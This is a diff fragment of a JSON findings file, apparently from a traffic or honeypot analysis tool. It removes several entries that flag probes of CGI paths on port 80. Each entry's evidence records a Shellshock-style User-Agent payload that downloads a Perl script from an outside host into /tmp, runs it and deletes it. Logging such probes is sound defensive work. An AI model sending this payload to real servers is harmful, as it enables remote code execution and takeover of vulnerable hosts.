-        "distinct_src_ips": 1,
-        "top_src_ips": [
-          {
-            "ip": "66.135.38.206",
-            "count": 1
-          }
-        ],
-        "dst_ips": [
-          "192.168.0.2"
-        ],
-        "dst_ports": [
-          80
-        ],
-        "hosts": [
-          "95.192.215.175"
-        ],
-        "methods": [
-          "GET"
-        ],
-        "user_agents": [
-          "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://ubimed.com/cata.txt -O /tmp/b.pl;curl -O /tmp/b.pl http://ubimed.com/cata.txt;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
-        ],
-        "matched_paths": [
-          {
-            "path": "/cgi-bin/",
-            "description": "CGI"
-          }
-        ]
-      },
-      "first_seen": 1428844396.023211,
-      "last_seen": 1428844406.905508
-    },
-    {
-      "type": "vulnerable_path",
-      "value": "/cgi-bin/php5-cli",
-      "confidence": 0.5,
-      "evidence": {
-        "path": "/cgi-bin/php5-cli",
-        "uri_samples": [
-          "/cgi-bin/php5-cli"
-        ],
-        "count": 1,
-        "distinct_src_ips": 1,
-        "top_src_ips": [
-          {
-            "ip": "66.135.38.206",
-            "count": 1
-          }
-        ],
-        "dst_ips": [
-          "192.168.0.2"
-        ],
-        "dst_ports": [
-          80
-        ],
-        "hosts": [
-          "95.192.215.175"
-        ],
-        "methods": [
-          "GET"
-        ],
-        "user_agents": [
-          "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://ubimed.com/cata.txt -O /tmp/b.pl;curl -O /tmp/b.pl http://ubimed.com/cata.txt;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
-        ],
-        "matched_paths": [
-          {
-            "path": "/cgi-bin/",
-            "description": "CGI"
-          }
-        ]
-      },
-      "first_seen": 1428844396.663132,
-      "last_seen": 1428844406.904859
-    },
-    {
-      "type": "vulnerable_path",
-      "value": "/cgi-bin/recent.cgi",
-      "confidence": 0.5,
-      "evidence": {
-        "path": "/cgi-bin/recent.cgi",
-        "uri_samples": [
-          "/cgi-bin/recent.cgi"
-        ],
-        "count": 1,
-        "distinct_src_ips": 1,
-        "top_src_ips": [
-          {
-            "ip": "66.135.38.206",
-            "count": 1
-          }
-        ],
-        "dst_ips": [
-          "192.168.0.2"
-        ],
-        "dst_ports": [
-          80
-        ],
-        "hosts": [
-          "95.192.215.175"
-        ],
-        "methods": [
-          "GET"
-        ],
-        "user_agents": [
-          "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://ubimed.com/cata.txt -O /tmp/b.pl;curl -O /tmp/b.pl http://ubimed.com/cata.txt;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
-        ],
-        "matched_paths": [
-          {
-            "path": "/cgi-bin/",
-            "description": "CGI"
-          }
-        ]
-      },
-      "first_seen": 1428844397.302739,
-      "last_seen": 1428844406.905172
-    },
-    {
-      "type": "vulnerable_path",
-      "value": "/cgi-bin/sat-ir-web.pl",
-      "confidence": 0.5,
-      "evidence": {
-        "path": "/cgi-bin/sat-ir-web.pl",
-        "uri_samples": [
-          "/cgi-bin/sat-ir-web.pl"
-        ],
-        "count": 1,
-        "distinct_src_ips": 1,
-        "top_src_ips": [
-          {
-            "ip": "66.135.38.206",
-            "count": 1
-          }
-        ],
-        "dst_ips": [
-          "192.168.0.2"
-        ],
-        "dst_ports": [
-          80
-        ],
-        "hosts": [
-          "95.192.215.175"
-        ],
-        "methods": [
-          "GET"
-        ],
-        "user_agents": [
-          "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://ubimed.com/cata.txt -O /tmp/b.pl;curl -O /tmp/b.pl http://ubimed.com/cata.txt;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
-        ],
-        "matched_paths": [
-          {
-            "path": "/cgi-bin/",
-            "description": "CGI"
-          }
-        ]
-      },
-      "first_seen": 1428844397.942603,
-      "last_seen": 1428844406.905167
-    },
-    {
-      "type": "vulnerable_path",
-      "value": "/cgi-bin/test-cgi.pl",
-      "confidence": 0.5,
-      "evidence": {
-        "path": "/cgi-bin/test-cgi.pl",
-        "uri_samples": [
-          "/cgi-bin/test-cgi.pl"
-        ],
-        "count": 1,
-        "distinct_src_ips": 1,
-        "top_src_ips": [
-          {
-            "ip": "66.135.38.206",
-            "count": 1
-          }
-        ],
-        "dst_ips": [
-          "192.168.0.2"
-        ],
-        "dst_ports": [
-          80
-        ],
-        "hosts": [
-          "95.192.215.175"
-        ],
-        "methods": [
-          "GET"
-        ],
-        "user_agents": [
-          "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://ubimed.com/cata.txt -O /tmp/b.pl;curl -O /tmp/b.pl http://ubimed.com/cata.txt;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
-        ],
-        "matched_paths": [
-          {
-            "path": "/cgi-bin/",
-            "description": "CGI"
-          }
-        ]
-      },
-      "first_seen": 1428844400.344452,
-      "last_seen": 1428844406.905511
-    },
-    {
-      "type": "vulnerable_path",
-      "value": "/cgi-bin/test.cgi",
-      "confidence": 0.5,
-      "evidence": {
-        "path": "/cgi-bin/test.cgi",
-        "uri_samples": [
-          "/cgi-bin/test.cgi"
-        ],
-        "count": 1,
-        "distinct_src_ips": 1,
-        "top_src_ips": [
-          {
-            "ip": "66.135.38.206",
-            "count": 1
-          }
-        ],
-        "dst_ips": [
-          "192.168.0.2"
-        ],
-        "dst_ports": [
-          80
-        ],
-        "hosts": [
-          "95.192.215.175"
-        ],
-        "methods": [
-          "GET"
-        ],
-        "user_agents": [
-          "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://ubimed.com/cata.txt -O /tmp/b.pl;curl -O /tmp/b.pl http://ubimed.com/cata.txt;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
-        ],
-        "matched_paths": [
-          {
-            "path": "/cgi-bin/",
-            "description": "CGI"
-          }
-        ]
-      },
-      "first_seen": 1428844399.862634,
-      "last_seen": 1428844406.90584
-    },
-    {
-      "type": "vulnerable_path",
-      "value": "/cgi-bin/test.sh",
-      "confidence": 0.5,
-      "evidence": {
-        "path": "/cgi-bin/test.sh",
-        "uri_samples": [
-          "/cgi-bin/test.sh"
-        ],
-        "count": 1,
-        "distinct_src_ips": 1,
-        "top_src_ips": [
-          {
-            "ip": "66.135.38.206",
-            "count": 1
-          }
-        ],
-        "dst_ips": [
-          "192.168.0.2"
-        ],
-        "dst_ports": [
-          80
-        ],
-        "hosts": [
-          "95.192.215.175"
-        ],
-        "methods": [
-          "GET"
-        ],
-        "user_agents": [
-          "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://ubimed.com/cata.txt -O /tmp/b.pl;curl -O /tmp/b.pl http://ubimed.com/cata.txt;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
-        ],
-        "matched_paths": [
-          {
-            "path": "/cgi-bin/",
-            "description": "CGI"
-          }
-        ]
-      },
-      "first_seen": 1428844401.143147,
-      "last_seen": 1428844406.905844
-    },
-    {
-      "type": "vulnerable_path",
-      "value": "/cgi-bin/tools/tools.pl",
-      "confidence": 0.5,
-      "evidence": {
-        "path": "/cgi-bin/tools/tools.pl",
-        "uri_samples": [
-          "/cgi-bin/tools/tools.pl"
-        ],
-        "count": 1,
-        "distinct_src_ips": 1,
-        "top_src_ips": [
-          {
-            "ip": "66.135.38.206",
-            "count": 1
-          }
-        ],
-        "dst_ips": [
-          "192.168.0.2"
-        ],
-        "dst_ports": [
-          80
-        ],
-        "hosts": [
-          "95.192.215.175"
-        ],
-        "methods": [
-          "GET"
-        ],
-        "user_agents": [
-          "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://ubimed.com/cata.txt -O /tmp/b.pl;curl -O /tmp/b.pl http://ubimed.com/cata.txt;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'"
-        ],
-        "matched_paths": [
-          {
-            "path": "/cgi-bin/",
-            "description": "CGI"
-          }
-        ]
-      },
-      "first_seen": 1428844401.782837,
-      "last_seen": 1428844406.905847
+      "last_seen": 1428844401.782837
     }
   ]
 }
